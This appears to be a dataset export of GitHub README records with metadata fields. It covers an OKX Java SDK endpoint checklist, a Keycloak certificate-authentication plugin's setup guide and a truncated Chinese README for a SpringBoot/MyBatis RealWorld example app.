      - [x] [POST / Place grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-place-grid-algo-order)
      - [x] [POST / Amend grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-amend-grid-algo-order)
      - [x] [POST / Stop grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-stop-grid-algo-order)
      - [x] [POST / Close position for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-close-position-for-contract-grid)
      - [x] [POST / Cancel close position order for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-cancel-close-position-order-for-contract-grid)
      - [x] [POST / Instant trigger grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-instant-trigger-grid-algo-order)
      - [x] [GET / Grid algo order list](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-list)
      - [x] [GET / Grid algo order history](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-history)
      - [x] [GET / Grid algo order details](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-details)
      - [x] [GET / Grid algo sub orders](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-sub-orders)
      - [x] [GET / Grid algo order positions](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-positions)
      - [x] [POST / Spot grid withdraw income](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-spot-grid-withdraw-income)
      - [x] [POST / Compute margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-margin-balance)
      - [x] [POST / Adjust margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-adjust-margin-balance)
      - [x] [POST / Add investment](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-add-investment)
      - [x] [GET / Grid AI parameter (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-ai-parameter-public)
      - [x] [POST / Compute min investment (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-min-investment-public)
      - [x] [GET / RSI back testing (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-rsi-back-testing-public)
- ### Websocket API
  - [Trading Account](https://www.okx.com/docs-v5/zh/#trading-account-websocket)
    - [x] [Account channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-channel)
    - [x] [Positions channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-positions-channel)
    - [x] [Balance and position channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-balance-and-position-channel)
    - [x] [Position risk warning](https://www.okx.com/docs-v5/en/#trading-account-websocket-position-risk-warning)
    - [x] [Account greeks channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-greeks-channel)
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [WS / Order channel](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-order-channel)
      - [x] [WS / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-order)
      - [x] [WS / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-multiple-orders)
      - [x] [WS / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-order)
      - [x] [WS / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-multiple-orders)
      - [x] [WS / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-order)
      - [x] [WS / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-multiple-orders)
      - [x] [WS / Mass cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-mass-cancel-order)
    - [Algo Trading](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading)
      - [x] [WS / Algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-algo-orders-channel)
      - [x] [WS / Advance algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-advance-algo-orders-channel)
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
      - [x] [WS / Spot grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-spot-grid-algo-orders-channel)
      - [x] [WS / Contract grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-contract-grid-algo-orders-channel)
      - [x] [WS / Grid positions channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-positions-channel)
      - [x] [WS / Grid sub orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-sub-orders-channel)
  - [Public Data](https://www.okx.com/docs-v5/en/#public-data-websocket)
    - [x] [Instruments channel](https://www.okx.com/docs-v5/en/#public-data-websocket-instruments-channel)
    - [x] [Open interest channel](https://www.okx.com/docs-v5/en/#public-data-websocket-open-interest-channel)
    - [x] [Funding rate channel](https://www.okx.com/docs-v5/en/#public-data-websocket-funding-rate-channel)
    - [x] [Price limit channel](https://www.okx.com/docs-v5/en/#public-data-websocket-price-limit-channel)
    - [x] [Option summary channel](https://www.okx.com/docs-v5/en/#public-data-websocket-option-summary-channel)
    - [x] [Estimated delivery/exercise price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-estimated-delivery-exercise-price-channel)
    - [x] [Mark price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-channel)
    - [x] [Index tickers channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-tickers-channel)
    - [x] [Mark price candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-candlesticks-channel)
    - [x] [Index candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-candlesticks-channel)
    - [x] [Liquidation orders channel](https://www.okx.com/docs-v5/en/#public-data-websocket-liquidation-orders-channel)
    - [x] [ADL warning channel](https://www.okx.com/docs-v5/en/#public-data-websocket-adl-warning-channel)
    - [x] [Economic calendar channel](https://www.okx.com/docs-v5/en/#public-data-websocket-economic-calendar-channel)
  - [Funding Account](https://www.okx.com/docs-v5/en/#funding-account-websocket)
    - [x] [Deposit info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-deposit-info-channel)
    - [x] [Withdrawal info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-withdrawal-info-channel)

## How to use

### Maven

```xml

<dependency>
    <groupId>xyz.felh</groupId>
    <artifactId>okx-v5-java</artifactId>
    <version>0.5.2024072701</version>
</dependency>
```

### Gradle

```yaml
implementation group: 'xyz.felh', name: 'okx-v5-java', version: '0.5.2024072701'
```

### sbt

```javascript
libraryDependencies += ""xyz.felh"" % ""okx-v5-java"" % ""0.5.2024072701""
```

## Important

- #### Automatically login when reconnected websocket if it has been login to PRIVATE channel
- #### Automatically restore all subscribe channels when reconnected websocket


## License

Published under the MIT License (https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)",0,0,1,mit,0.0,"['okx', 'sdk', 'java', 'going', 'implement', 'apis', 'official', 'api', 'document', 'sdk', 'api', 'status', 'rest', 'api', 'trading', 'account', 'x', 'get', 'balance', 'get', 'position', 'get', 'position', 'history', 'get', 'account', 'position', 'risk', 'get', 'bill', 'detail', 'last', 'day', 'get', 'bill', 'detail', 'last', 'month', 'get', 'account', 'configuration', 'set', 'position', 'mode', 'set', 'leverage', 'get', 'maximum', 'amount', 'open', 'amount', 'order', 'book', 'trading', 'trade', 'x', 'post', 'place', 'order', 'post', 'place', 'multiple', 'order', 'x', 'post', 'cancel', 'order', 'post', 'cancel', 'multiple', 'order', 'post', 'amend', 'order', 'post', 'amend', 'multiple', 'order', 'post', 'close', 'position', 'grid', 'trading', 'x', 'post', 'place', 'grid', 'algo', 'order', 'x', 'post', 'amend', 'grid', 'algo', 'order', 'x', 'post', 'stop', 'grid', 'algo', 'order', 'x', 'post', 'close', 'position', 'contract', 'grid', 'x', 'post', 'cancel', 'close', 'position', 'order', 'contract', 'grid', 'x', 'post', 'instant', 'trigger', 'grid', 'algo', 'order', 'x', 'get', 'grid', 'algo', 'order', 'list', 'x', 'get', 'grid', 'algo', 'order', 'history', 'x', 'get', 'grid', 'algo', 'order', 'detail', 'x', 'get', 'grid', 'algo', 'sub', 'order', 'x', 'get', 'grid', 'algo', 'order', 'position', 'x', 'post', 'spot', 'grid', 'withdraw', 'income', 'x', 'post', 'compute', 'margin', 'balance', 'x', 'post', 'adjust', 'margin', 'balance', 'x', 'post', 'add', 'investment', 'x', 'get', 'grid', 'ai', 'parameter', 'public', 'x', 'post', 'compute', 'min', 'investment', 'public', 'x', 'get', 'rsi', 'back', 'testing', 'public', 'websocket', 'api', 'trading', 'account', 'x', 'account', 'channel', 'x', 'position', 'channel', 'x', 'balance', 'position', 'channel', 'x', 'position', 'risk', 'warning', 'x', 'account', 'greek', 'channel', 'order', 'book', 'trading', 'trade', 'x', 'w', 'order', 'channel', 'x', 'w', 'place', 'order', 'x', 'w', 'place', 'multiple', 'order', 'x', 'w', 'cancel', 'order', 'x', 'w', 'cancel', 'multiple', 'order', 'x', 'w', 'amend', 'order', 'x', 'w', 'amend', 'multiple', 'order', 'x', 'w', 'mass', 'cancel', 'order', 'algo', 'trading', 'x', 'w', 'algo', 'order', 'channel', 'x', 'w', 'advance', 'algo', 'order', 'channel', 'grid', 'trading', 'x', 'w', 'spot', 'grid', 'algo', 'order', 'channel', 'x', 'w', 'contract', 'grid', 'algo', 'order', 'channel', 'x', 'w', 'grid', 'position', 'channel', 'x', 'w', 'grid', 'sub', 'order', 'channel', 'public', 'data', 'x', 'instrument', 'channel', 'x', 'open', 'interest', 'channel', 'x', 'funding', 'rate', 'channel', 'x', 'price', 'limit', 'channel', 'x', 'option', 'summary', 'channel', 'x', 'estimated', 'price', 'channel', 'x', 'mark', 'price', 'channel', 'x', 'index', 'ticker', 'channel', 'x', 'mark', 'price', 'candlestick', 'channel', 'x', 'index', 'candlestick', 'channel', 'x', 'liquidation', 'order', 'channel', 'x', 'adl', 'warning', 'channel', 'x', 'economic', 'calendar', 'channel', 'funding', 'account', 'x', 'deposit', 'info', 'channel', 'x', 'withdrawal', 'info', 'channel', 'use', 'maven', 'gradle', 'sbt', 'important', 'automatically', 'login', 'reconnected', 'websocket', 'login', 'private', 'channel', 'automatically', 'restore', 'subscribe', 'channel', 'reconnected', 'websocket', 'license', 'published', 'mit', 'license', 'http']","['x', 'order', 'channel', 'grid', 'post']",0,0,0,"['sdk', 'api', 'status', 'rest', 'api', 'websocket', 'api', 'how', 'use', 'maven', 'gradle', 'sbt', 'important', 'automatically', 'login', 'reconnected', 'websocket', 'login', 'private', 'channel', 'automatically', 'restore', 'subscribe', 'channel', 'reconnected', 'websocket', 'license']",12,"['api', 'websocket', 'automatically', 'login', 'reconnected']",3,6.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0,10701,334.4,4.5131578947368425,"['![GitHub version -> https://img.shields.io/static/v1?label=version&message=v0.5.2024072701&color=blue', '![License -> https://img.shields.io/static/v1?label=license&message=MIT&color=orange', 'official api document -> https://www.okx.com/docs-v5/en/#overview', 'Trading Account -> https://www.okx.com/docs-v5/en/#trading-account-rest-api', 'x] [Get Balance -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-balance', ' ] [Get positions -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions', ' ] [Get positions history -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions-history', ' ] [Get account and position risk -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-and-position-risk', ' ] [Get bills details (last 7 days) -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-7-days', ' ] [Get bills details (last 3 months) -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-3-months', ' ] [Get account configuration -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-configuration', ' ] [Set position mode -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-position-mode', ' ] [Set leverage -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-leverage', ' ] [Get maximum buy/sell amount or open amount -> https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-maximum-buy-sell-amount-or-open-amount', 'Order Book Trading -> https://www.okx.com/docs-v5/en/#order-book-trading', 'Trade -> https://www.okx.com/docs-v5/en/#order-book-trading-trade', 'x] [POST / Place order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-order', ' ] [POST / Place multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-multiple-orders', 'x] [POST / Cancel order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-order', ' ] [POST / Cancel multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-multiple-orders', ' ] [POST / Amend order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-order', ' ] [POST / Amend multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-multiple-orders', ' ] [POST / Close positions -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-close-positions', 'Grid Trading -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading', 'x] [POST / Place grid algo order -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-place-grid-algo-order', 'x] [POST / Amend grid algo order -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-amend-grid-algo-order', 'x] [POST / Stop grid algo order -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-stop-grid-algo-order', 'x] [POST / Close position for contract grid -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-close-position-for-contract-grid', 'x] [POST / Cancel close position order for contract grid -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-cancel-close-position-order-for-contract-grid', 'x] [POST / Instant trigger grid algo order -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-instant-trigger-grid-algo-order', 'x] [GET / Grid algo order list -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-list', 'x] [GET / Grid algo order history -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-history', 'x] [GET / Grid algo order details -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-details', 'x] [GET / Grid algo sub orders -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-sub-orders', 'x] [GET / Grid algo order positions -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-positions', 'x] [POST / Spot grid withdraw income -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-spot-grid-withdraw-income', 'x] [POST / Compute margin balance -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-margin-balance', 'x] [POST / Adjust margin balance -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-adjust-margin-balance', 'x] [POST / Add investment -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-add-investment', 'x] [GET / Grid AI parameter (public) -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-ai-parameter-public', 'x] [POST / Compute min investment (public) -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-min-investment-public', 'x] [GET / RSI back testing (public) -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-rsi-back-testing-public', 'Trading Account -> https://www.okx.com/docs-v5/zh/#trading-account-websocket', 'x] [Account channel -> https://www.okx.com/docs-v5/en/#trading-account-websocket-account-channel', 'x] [Positions channel -> https://www.okx.com/docs-v5/en/#trading-account-websocket-positions-channel', 'x] [Balance and position channel -> https://www.okx.com/docs-v5/en/#trading-account-websocket-balance-and-position-channel', 'x] [Position risk warning -> https://www.okx.com/docs-v5/en/#trading-account-websocket-position-risk-warning', 'x] [Account greeks channel -> https://www.okx.com/docs-v5/en/#trading-account-websocket-account-greeks-channel', 'Order Book Trading -> https://www.okx.com/docs-v5/en/#order-book-trading', 'Trade -> https://www.okx.com/docs-v5/en/#order-book-trading-trade', 'x] [WS / Order channel -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-order-channel', 'x] [WS / Place order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-order', 'x] [WS / Place multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-multiple-orders', 'x] [WS / Cancel order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-order', 'x] [WS / Cancel multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-multiple-orders', 'x] [WS / Amend order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-order', 'x] [WS / Amend multiple orders -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-multiple-orders', 'x] [WS / Mass cancel order -> https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-mass-cancel-order', 'Algo Trading -> https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading', 'x] [WS / Algo orders channel -> https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-algo-orders-channel', 'x] [WS / Advance algo orders channel -> https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-advance-algo-orders-channel', 'Grid Trading -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading', 'x] [WS / Spot grid algo orders channel -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-spot-grid-algo-orders-channel', 'x] [WS / Contract grid algo orders channel -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-contract-grid-algo-orders-channel', 'x] [WS / Grid positions channel -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-positions-channel', 'x] [WS / Grid sub orders channel -> https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-sub-orders-channel', 'Public Data -> https://www.okx.com/docs-v5/en/#public-data-websocket', 'x] [Instruments channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-instruments-channel', 'x] [Open interest channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-open-interest-channel', 'x] [Funding rate channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-funding-rate-channel', 'x] [Price limit channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-price-limit-channel', 'x] [Option summary channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-option-summary-channel', 'x] [Estimated delivery/exercise price channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-estimated-delivery-exercise-price-channel', 'x] [Mark price channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-channel', 'x] [Index tickers channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-index-tickers-channel', 'x] [Mark price candlesticks channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-candlesticks-channel', 'x] [Index candlesticks channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-index-candlesticks-channel', 'x] [Liquidation orders channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-liquidation-orders-channel', 'x] [ADL warning channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-adl-warning-channel', 'x] [Economic calendar channel -> https://www.okx.com/docs-v5/en/#public-data-websocket-economic-calendar-channel', 'Funding Account -> https://www.okx.com/docs-v5/en/#funding-account-websocket', 'x] [Deposit info channel -> https://www.okx.com/docs-v5/en/#funding-account-websocket-deposit-info-channel', 'x] [Withdrawal info channel -> https://www.okx.com/docs-v5/en/#funding-account-websocket-withdrawal-info-channel', 'x', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'x', ' ', 'x', ' ', ' ', ' ', ' ', ' ', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x']",154
core247/keycloak-eds-plugin,main,"# Keycloak EDS plugin
The Keycloak plugin for certificate-based authentication enables the use of 
X.509 certificates for user authentication.
When a user attempts to log in, the plugin prompts the user to present a certificate. 
If the user's client certificate is supported, authentication will be based on the 
information contained within that certificate.
The user certificate plugin provides security by allowing users to authenticate using 
two-factor authentication. This means the user must provide something they know (password)
and something they are in possession of (certificate).
The plugin can also be configured to perform additional checks such as checking the
Certificate Revocation List (CRL)(see revoke-api documentation part below)
In essence, the Keycloak plugin for certificate-based authentication provides 
outstanding security and flexibility for the users and administrators of your system.

It was developed and tested against **Keycloak 22.0.4**. 
Compatibility with other versions of Keycloak is not guaranteed.

## License
This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## Getting Help

If you find a bug or an issue, please

[report an issue](https://github.com/core247/keycloak-eds-plugin/issues/new) on the keycloak eds plugin repository

## Contributing

See the [contributing documentation](CONTRIBUTING.md)

## What does plugin provides:
- Implement secondary sign-in step in the browser flow.
- Validate and perform revocation checks on certificates.
- Verify users based on their user attributes.

## Local development
- Use `Amazon Corretto 17` as the SDK.

- For local development, put these libraries in the `libs` folder:
    - `commons-logging-1.1.1.jar`
    - `kalkancrypt-0.7.2.jar`
    - `kalkancrypt_xmldsig-0.4.jar`
    - `knca_provider_util-0.8.jar`
    - `xmlsec-1.5.8.jar`

- Build the plugin with Maven using `mvn clean package`.

- - Use docker-compose to launch Keycloak with the plugin:
```
cd docker
docker-compose up -d
```

## Configuring Keycloak for Local Testing

[KEYCLOAK-CONFIGURE.md](KEYCLOAK-CONFIGURE.md)

## Using on production

For production use, you should place the Keycloak plugin JAR file and other 
Kalkan libraries in the same location as specified in the docker-compose file:

- Place the `eds-plugin-corporate-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar` directory. 
  The path should look like this: `../eds-plugin-corporate/target/eds-plugin-corporate-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar`
- Place the `eds-plugin-individual-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-individual.jar` directory.
  The path should look like this: `../eds-plugin-individual/target/eds-plugin-individual-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-individual.jar`
- Place the contents of the `libs` directory in the `/opt/bitnami/keycloak/providers` directory. 
  The path should look like this: `../libs/:/opt/bitnami/keycloak/providers/`
- Configure user attributes in keycloak
  - For individual users to be able to use the plugin, you need to add an attribute named 
    `initials` to the user's attributes. This attribute should contain the User's Tax Code. 
     The plugin will use this specific attribute for identification purposes.
  - For corporate users, you need to add the attribute userClass representing the 
    Corporate's BIN (Tax Code). Similar to individual users, this attribute enhances the 
    plugin's capability to identify a corporate user.
- Additionally, for handling certificate revocations, you should refer to the documentation in the revoke-api section below.

### revoke-api
The `revoke-api` module is designed to facilitate setting up certificate verification 
according to your custom implementation. You can extend and tailor the functionality 
of the certificate verifier to satisfy your specific needs.

By default, the system utilizes the `kz.core247.keycloak.eds.revoke.NullCommonCertificateVerifier` implementation 
if no custom implementation is provided by the user. This default implementation consistently
returns a positive (true) result.

#### Steps
- Implement the `kz.core247.keycloak.eds.revoke.CommonCertificateVerifier` interface.
Start by creating a class that implements the CommonCertificateVerifier interface. 
Your class should have defined all methods indicated in the interface.

Refer to the `kz.core247.example.RandomCommonCertificateVerifier` in the `random-revoke-api-impl` module 
as an illustrative example of this implementation.

- Specify the Location of the JAR in Docker Setup
  If you are using Docker, you will need to add the JAR file to your Keycloak setup. Specify the location of the jar file in your docker-compose.yml file.
  ```volumes:
    - ../random-revoke-api-impl/target/random-revoke-api-impl-1.0.0.jar:/opt/bitnami/keycloak/providers/random-revoke-api-impl.jar```

- Configure system properties
  Delineate your custom class through the utilization of system properties. Particularly, apply the 'INDIVIDUAL_CERT_VERIFIER_CLASS_NAME' and 'CORPORATE_CERT_VERIFIER_CLASS_NAME' properties.
  When deploying with Docker, system properties can be set in the environment configuration. For example:
  ```
     JAVA_OPTS_APPEND: -DINDIVIDUAL_CERT_VERIFIER_CLASS_NAME=kz.core247.example.RandomCommonCertificateVerifier
  ```
  Replace `kz.core247.example.RandomCommonCertificateVerifier` with your implemented class. This allows the revoke-api module to use your custom class for certificate verification.",0,2,1,apache-2.0,0.0,"['keycloak', 'ed', 'plugin', 'keycloak', 'plugin', 'authentication', 'enables', 'use', 'certificate', 'user', 'authentication', 'user', 'attempt', 'log', 'plugin', 'prompt', 'user', 'present', 'certificate', 'user', 'client', 'certificate', 'supported', 'authentication', 'based', 'information', 'contained', 'within', 'certificate', 'user', 'certificate', 'plugin', 'provides', 'security', 'allowing', 'user', 'authenticate', 'using', 'authentication', 'mean', 'user', 'must', 'provide', 'something', 'know', 'password', 'something', 'possession', 'certificate', 'plugin', 'also', 'configured', 'perform', 'additional', 'check', 'checking', 'certificate', 'revocation', 'list', 'crl', 'see', 'documentation', 'part', 'essence', 'keycloak', 'plugin', 'authentication', 'provides', 'outstanding', 'security', 'flexibility', 'user', 'administrator', 'system', 'developed', 'tested', 'keycloak', 'compatibility', 'version', 'keycloak', 'guaranteed', 'license', 'project', 'licensed', 'apache', 'license', 'see', 'license', 'file', 'detail', 'getting', 'help', 'find', 'bug', 'issue', 'please', 'report', 'issue', 'keycloak', 'ed', 'plugin', 'repository', 'contributing', 'see', 'contributing', 'documentation', 'plugin', 'provides', 'implement', 'secondary', 'step', 'browser', 'flow', 'validate', 'perform', 'revocation', 'check', 'certificate', 'verify', 'user', 'based', 'user', 'attribute', 'local', 'development', 'use', 'sdk', 'local', 'development', 'put', 'library', 'folder', 'build', 'plugin', 'maven', 'using', 'use', 'launch', 'keycloak', 'plugin', 'configuring', 'keycloak', 'local', 'testing', 'using', 'production', 'production', 'use', 'place', 'keycloak', 'plugin', 'jar', 'file', 'kalkan', 'library', 'location', 'specified', 'file', 'place', 'file', 'directory', 'path', 'look', 'like', 'place', 'file', 'directory', 'path', 'look', 'like', 'place', 'content', 'directory', 'directory', 'path', 'look', 'like', 'configure', 'user', 'attribute', 'keycloak', 'individual', 'user', 'able', 'use', 'plugin', 'need', 'add', 'attribute', 'named', 'user', 'attribute', 'attribute', 'contain', 'user', 'tax', 'code', 'plugin', 'use', 'specific', 'attribute', 'identification', 'purpose', 'corporate', 'user', 'need', 'add', 'attribute', 'userclass', 'representing', 'corporate', 'bin', 'tax', 'code', 'similar', 'individual', 'user', 'attribute', 'enhances', 'plugin', 'capability', 'identify', 'corporate', 'user', 'additionally', 'handling', 'certificate', 'revocation', 'refer', 'documentation', 'section', 'module', 'designed', 'facilitate', 'setting', 'certificate', 'verification', 'according', 'custom', 'implementation', 'extend', 'tailor', 'functionality', 'certificate', 'verifier', 'satisfy', 'specific', 'need', 'default', 'system', 'utilizes', 'implementation', 'custom', 'implementation', 'provided', 'user', 'default', 'implementation', 'consistently', 'return', 'positive', 'true', 'result', 'step', 'implement', 'interface', 'start', 'creating', 'class', 'implement', 'commoncertificateverifier', 'interface', 'class', 'defined', 'method', 'indicated', 'interface', 'refer', 'module', 'illustrative', 'example', 'implementation', 'specify', 'location', 'jar', 'docker', 'setup', 'using', 'docker', 'need', 'add', 'jar', 'file', 'keycloak', 'setup', 'specify', 'location', 'jar', 'file', 'file', 'configure', 'system', 'property', 'delineate', 'custom', 'class', 'utilization', 'system', 'property', 'particularly', 'apply', 'property', 'deploying', 'docker', 'system', 'property', 'set', 'environment', 'configuration', 'example', 'replace', 'implemented', 'class', 'allows', 'module', 'use', 'custom', 'class', 'certificate', 'verification']","['user', 'plugin', 'certificate', 'keycloak', 'file']",5,0,0,"['keycloak', 'ed', 'plugin', 'license', 'get', 'help', 'contribute', 'what', 'plugin', 'provide', 'local', 'development', 'configure', 'keycloak', 'local', 'testing', 'use', 'production', 'step']",10,"['keycloak', 'plugin', 'local', 'ed', 'license']",3,38.0,7.0,"[com.mycila:license-maven-plugin,maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,6.0,1.0,5600,21.026315789473685,5.531914893617022,['report an issue -> https://github.com/core247/keycloak-eds-plugin/issues/new'],1
joyheros/realworld,main,"# ![RealWorld Example App](./logo.png)

**中文** | [English](./README.en-US.md)

**Java 21 + SpringBoot 3 + MyBatis** 代码库包含符合[RealWorld](https://github.com/gothinkster/realworld)规范和API的真实示例(CRUD, auth，高级模式等)。  

创建这个代码库是为了演示一个用**Java 21 + SrpingBoot 3 + MyBatis**构建的成熟的全栈应用程序，包括CRUD操作、身份验证、路由、分页等功能。  

我们竭尽全力坚持Java, SpringBoot和MyBatis的社区风格指南和最佳实践。  

有关如何与其他前端/后端一起工作的更多信息，请访问[RealWorld](https://github.com/gothinkster/realworld)。  

# 项目特点

* 使用领域驱动设计的思想来分离业务逻辑和基础设施。  
* 使用MyBatis实现[Data Mapper](https://martinfowler.com/eaaCatalog/dataMapper.html)持久化模块。  
* 将应用程序分离为多个模块，并使用Maven进行组织。  

本项目代码分为4个模块:  
1. app-permission模块包括与权限相关的实体，包括应用的用户、配置文件和安全机制。  
2. app-common通用模块包括关于异常定义的通用实现。  
3. app-article模块包括文章发布/编辑/删除等业务逻辑。  
4. app-main模块是启动应用程序的应用程序入口程序。  

应用程序的逻辑分层组织如下:
1. `application`是由Spring MVC和高层服务实现的web层。  
